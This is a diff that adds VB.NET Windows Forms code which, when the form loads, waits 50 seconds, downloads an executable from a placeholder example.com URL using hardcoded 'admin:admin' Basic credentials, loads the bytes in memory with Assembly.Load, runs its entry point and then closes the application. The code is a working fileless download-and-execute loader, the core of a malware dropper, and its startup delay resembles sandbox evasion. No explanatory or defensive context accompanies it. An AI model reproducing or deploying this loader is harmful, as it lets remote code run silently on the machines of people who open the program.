@@ -1,0 +1,25 @@
+Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+        Thread.Sleep(50000)
+        DownloadExecute("https://example.com/example.exe")
+    End Sub
+    Public Sub DownloadExecute(ByVal url As String)
+        Dim c As New WebClient
+        Dim credentials As String = Convert.ToBase64String(Encoding.ASCII.GetBytes("admin" & ":" & "admin"))
+        c.Headers(HttpRequestHeader.Authorization) = String.Format("Basic {0}", credentials)
+        Execute(c.DownloadData(url))
+    End Sub
+    Public Sub Execute(ByVal bytes As Byte())
+        Dim t As New Thread(AddressOf DoExecute)
+        t.TrySetApartmentState(ApartmentState.STA)
+        t.Start(bytes)
+    End Sub
+    Public Sub DoExecute(ByVal d As Byte())
+        Dim asm As Assembly = Assembly.Load(d)
+        Dim entryPoint As MethodInfo = asm.EntryPoint
+        Dim o As Object() = Nothing
+        If entryPoint.GetParameters().Length > 0 Then
+            o = New Object() {New String() {"1"}}
+        End If
+        entryPoint.Invoke(Nothing, o)
+        Application.Exit()
+    End Sub
